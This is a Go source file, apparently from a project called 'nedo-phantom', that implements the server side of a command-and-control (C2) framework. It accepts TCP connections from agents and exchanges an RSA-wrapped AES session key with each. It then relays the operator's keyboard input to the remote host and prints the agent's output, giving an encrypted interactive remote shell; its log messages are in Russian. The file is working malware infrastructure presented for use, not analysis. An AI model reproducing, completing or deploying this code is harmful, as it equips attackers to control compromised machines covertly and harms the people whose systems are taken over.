package core

import (
    "bufio"
    "encoding/binary"
    "encoding/pem"
    "fmt"
    "net"
    "os"
    "strings"
    "time"

    "nedo-phantom/internal/c2/cli"
    "nedo-phantom/internal/c2/crypto"
    "nedo-phantom/internal/c2/db"
    "nedo-phantom/internal/c2/handler"
    "nedo-phantom/internal/c2/terminal"
    "nedo-phantom/internal/common"
)

type Server struct {
    addr    string
    tasks   *db.TaskQueue
    agents  map[string]*AgentSession
    cli     *cli.Commander
    handler *handler.MessageHandler
    term    *terminal.Terminal
}

func NewServer(addr string) *Server {
    tasks := db.NewTaskQueue()
    return &Server{
        addr:    addr,
        tasks:   tasks,
        agents:  make(map[string]*AgentSession),
        cli:     cli.NewCommander(tasks),
        handler: handler.NewMessageHandler(tasks),
        term:    terminal.NewTerminal(),
    }
}

func (s *Server) Run() error {
    listener, err := net.Listen("tcp", s.addr)
    if err != nil {
        return err
    }
    defer listener.Close()

    fmt.Printf("\r[C2] Server listening on %s\n", s.addr)

    for {
        conn, err := listener.Accept()
        if err != nil {
            fmt.Printf("Accept error: %v\n", err)
            continue
        }
        go s.handleAgent(conn)
    }
}

func (s *Server) handleAgent(conn net.Conn) {
    defer conn.Close()

    reader := bufio.NewReader(conn)
    var fullPEM strings.Builder
    for {
        line, err := reader.ReadString('\n')
        if err != nil {
            fmt.Println("\rОшибка чтения:", err)
            return
        }
        fullPEM.WriteString(line)
        if strings.Contains(line, "-----END PUBLIC KEY-----") {
            break
        }
    }

    pemData := fullPEM.String()
    if !strings.HasPrefix(pemData, "KEY:") {
        fmt.Println("\rНеверный формат: ожидается 'KEY:'")
        return
    }

    publicKeyPEM := strings.TrimPrefix(pemData, "KEY:")
    publicKeyPEM = strings.TrimSpace(publicKeyPEM)

    fmt.Printf("\r[+] Получен публичный ключ от агента\n")
    fmt.Printf("\r[+] Длина PEM: %d байт\n", len(publicKeyPEM))

    block, _ := pem.Decode([]byte(publicKeyPEM))
    if block == nil {
        fmt.Println("\r[-] Ошибка: не удалось декодировать PEM")
        return
    }
    fmt.Printf("\r[+] PEM успешно декодирован, тип: %s\n", block.Type)

    aesKey, err := crypto.GenerateSymmetricKey()
    if err != nil {
        fmt.Printf("\r[-] Ошибка генерации AES ключа: %v\n", err)
        return
    }
    fmt.Printf("\r[+] AES ключ сгенерирован (%d байт)\n", len(aesKey))

    encryptedKey, err := crypto.EncryptSymmetricKey(publicKeyPEM, aesKey)
    if err != nil {
        fmt.Printf("\r[-] Ошибка шифрования AES ключа: %v\n", err)
        return
    }
    fmt.Printf("\r[+] AES ключ зашифрован (%d байт)\n", len(encryptedKey))

    lengthBuf := make([]byte, 4)
    binary.BigEndian.PutUint32(lengthBuf, uint32(len(encryptedKey)))
    if _, err := conn.Write(lengthBuf); err != nil {
        fmt.Printf("\r[-] Ошибка отправки длины: %v\n", err)
        return
    }
    if _, err := conn.Write(encryptedKey); err != nil {
        fmt.Printf("\r[-] Ошибка отправки ключа: %v\n", err)
        return
    }
    fmt.Println("\r[+] Зашифрованный AES ключ отправлен агенту")

    serverCrypto := crypto.NewServerCryptoFromKey(aesKey)

    hostname, err := s.readSecureString(conn, serverCrypto)
    if err != nil {
        fmt.Printf("\r[-] Ошибка чтения hostname: %v\n", err)
        return
    }
    fmt.Printf("\r[+] Агент подключился: %s\n", hostname)

    s.agents[hostname] = &AgentSession{
        conn:       conn,
        hostname:   hostname,
        lastSeen:   time.Now(),
        publicKey:  publicKeyPEM,
        aesKey:     aesKey,
        secureConn: nil,
    }

    if err := s.term.Raw(); err != nil {
        fmt.Printf("\r[-] Ошибка настройки терминала: %v\n", err)
    }

    s.interactiveModeSecure(conn, serverCrypto)

    if err := s.term.Restore(); err != nil {
        fmt.Printf("\r[-] Ошибка восстановления терминала: %v\n", err)
    }

    delete(s.agents, hostname)
    fmt.Printf("\r[+] Сессия с агентом %s завершена\n", hostname)
}

func (s *Server) readSecureString(conn net.Conn, cipher common.Cipher) (string, error) {
    lengthBuf := make([]byte, 4)
    if _, err := conn.Read(lengthBuf); err != nil {
        return "", err
    }
    length := binary.BigEndian.Uint32(lengthBuf)

    encrypted := make([]byte, length)
    if _, err := conn.Read(encrypted); err != nil {
        return "", err
    }

    plaintext, err := cipher.Decrypt(encrypted)
    if err != nil {
        return "", err
    }

    return string(plaintext), nil
}

func (s *Server) interactiveModeSecure(conn net.Conn, cipher common.Cipher) {
    conn.SetReadDeadline(time.Time{})
    done := make(chan bool)

    go func() {
        for {
            data, err := s.readSecureData(conn, cipher)
            if err != nil {
                done <- true
                return
            }

            trimmed := strings.TrimSpace(string(data))
            if strings.HasPrefix(trimmed, "{") && strings.HasSuffix(trimmed, "}") {
                msg, err := common.ParseMessage(data)
                if err != nil {
                    fmt.Printf("[-] Ошибка парсинга JSON: %v\n", err)
                    continue
                }
                resp, err := s.handler.Handle(msg)
                if err != nil {
                    fmt.Printf("[-] Ошибка обработки: %v\n", err)
                    continue
                }
                if resp != nil {
                    if respData, err := common.MarshalMessage(resp); err == nil {
                        s.writeSecureData(conn, cipher, respData)
                    }
                }
            } else {
                os.Stdout.Write(data)
            }
        }
    }()

    go func() {
        buf := make([]byte, 4096)
        for {
            n, err := os.Stdin.Read(buf)
            if n > 0 {
                if err := s.writeSecureData(conn, cipher, buf[:n]); err != nil {
                    done <- true
                    return
                }
            }
            if err != nil {
                done <- true
                return
            }
        }
    }()

    <-done
    fmt.Println("\n\r[+] Выход из интерактивного режима")
    conn.SetReadDeadline(time.Now().Add(60 * time.Second))
}

func (s *Server) readSecureData(conn net.Conn, cipher common.Cipher) ([]byte, error) {
    lengthBuf := make([]byte, 4)
    if _, err := conn.Read(lengthBuf); err != nil {
        return nil, err
    }
    length := binary.BigEndian.Uint32(lengthBuf)

    encrypted := make([]byte, length)
    if _, err := conn.Read(encrypted); err != nil {
        return nil, err
    }

    return cipher.Decrypt(encrypted)
}

func (s *Server) writeSecureData(conn net.Conn, cipher common.Cipher, data []byte) error {
    encrypted, err := cipher.Encrypt(data)
    if err != nil {
        return err
    }

    lengthBuf := make([]byte, 4)
    binary.BigEndian.PutUint32(lengthBuf, uint32(len(encrypted)))
    if _, err := conn.Write(lengthBuf); err != nil {
        return err
    }

    if _, err := conn.Write(encrypted); err != nil {
        return err
    }

    return nil
}
